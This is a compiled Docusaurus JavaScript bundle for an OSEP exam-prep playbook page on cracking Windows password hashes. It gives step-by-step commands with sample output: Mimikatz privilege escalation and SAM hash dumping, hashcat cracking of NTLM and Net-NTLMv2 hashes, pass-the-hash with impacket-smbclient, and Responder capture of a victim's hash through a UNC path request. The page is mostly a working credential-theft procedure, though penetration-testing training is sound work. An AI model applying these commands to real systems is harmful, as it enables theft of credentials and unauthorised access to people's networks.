"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[5443],{6662(e,s,n){n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>l,metadata:()=>r,toc:()=>o});const r=JSON.parse('{"id":"osep/Credentials/Cracking Hashes","title":"Cracking Hashes","description":"Cracking Hashes","source":"@site/docs/osep/Credentials/Cracking Hashes.md","sourceDirName":"osep/Credentials","slug":"/osep/Credentials/Cracking Hashes","permalink":"/OSEP-Playbook/osep/Credentials/Cracking Hashes","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"UAC Bypass","permalink":"/OSEP-Playbook/osep/Defense Evasion/UAC Bypass"},"next":{"title":"Mimikatz","permalink":"/OSEP-Playbook/osep/Credentials/Mimikatz"}}');var i=n(4848),t=n(8453);const l={},a=void 0,c={},o=[{value:"<strong>Cracking Hashes</strong>",id:"cracking-hashes",level:3},{value:"<strong>NTLM</strong>",id:"ntlm",level:3},{value:"<strong>Net-NTLMv2</strong>",id:"net-ntlmv2",level:3}];function h(e){const s={code:"code",em:"em",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.h3,{id:"cracking-hashes",children:(0,i.jsx)(s.strong,{children:"Cracking Hashes"})}),"\n",(0,i.jsx)(s.h3,{id:"ntlm",children:(0,i.jsx)(s.strong,{children:"NTLM"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:["Set\xa0",(0,i.jsx)(s.em,{children:"SeDebugPrivilege"}),"\xa0access (needed to use Mimikatz):"]}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-powershell",children:"PS C:\\tools> .\\mimikatz.exe\nmimikatz # privilege::debug\nPrivilege '20' OK\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.strong,{children:"Elevate to SYSTEM user privileges and dump credentials"})}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-powershell",children:"mimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\nmimikatz # lsadump::sam\nDomain : <DOMAIN>\nSysKey : <SysKey>\nLocal SID : <Local SID>\n\nRID  : <RID>\nUser : <USERNAME>\nHash NTLM: <NTLM_HASH>\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.strong,{children:"Crack the NTLM hash"})}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# Rule is optional\nhashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.strong,{children:"If uncrackable, consider Pass-The-Hash"})}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# Pass-the-Hash using SMBClient\nimpacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>\n\n"})}),"\n",(0,i.jsx)(s.h3,{id:"net-ntlmv2",children:(0,i.jsx)(s.strong,{children:"Net-NTLMv2"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.strong,{children:"Parameters:"})}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"<interface>"}),": Network interface to listen on (e.g.,\xa0",(0,i.jsx)(s.code,{children:"eth0"}),",\xa0",(0,i.jsx)(s.code,{children:"wlan0"}),", etc.)."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"<responder_ip>"}),": IP address of the machine running Responder."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"<victim_ip>"}),": IP address of the victim machine."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"<DOMAIN>"}),": Domain of the user."]}),"\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"<hash_file>"}),": File containing the captured NTLMv2 hash."]}),"\n"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Start Responder"}),": run the Responder tool to capture Net-NTLMv2 hashes. Ensure the victim requests a file that does\xa0",(0,i.jsx)(s.strong,{children:"not"}),"\xa0exist to generate the necessary traffic."]}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"sudo responder -I <interface>\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Victim Request Example"}),": the victim's request to the Responder server can be through various services. For instance, an HTTP request might look like this:"]}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-powershell",children:"C:\\Windows\\system32> dir \\\\<responder_ip>\\test\ndir \\\\<responder_ip>\\test\nAccess is denied.\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Capture Example Output"}),": after the victim's request, you should see output similar to this:"]}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"[SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>\n[SMB] NTLMv2-SSP Username : <DOMAIN>\\emma\n[SMB] NTLMv2-SSP Hash     : emma::<DOMAIN>:<NTLM_HASH>\n\n"})}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.strong,{children:"Crack the Hash"}),": use Hashcat to crack the captured NTLMv2 hash. The hashcat mode for Net-NTLMv2 is\xa0",(0,i.jsx)(s.code,{children:"5600"}),"."]}),"\n"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force\nhashcat (v6.2.5) starting\n...\n<DOMAIN>\\emma::<NTLM_HASH>:123Password123\n...\n\n"})})]})}function d(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},8453(e,s,n){n.d(s,{R:()=>l,x:()=>a});var r=n(6540);const i={},t=r.createContext(i);function l(e){const s=r.useContext(t);return r.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:l(e.components),r.createElement(t.Provider,{value:s},e.children)}}}]);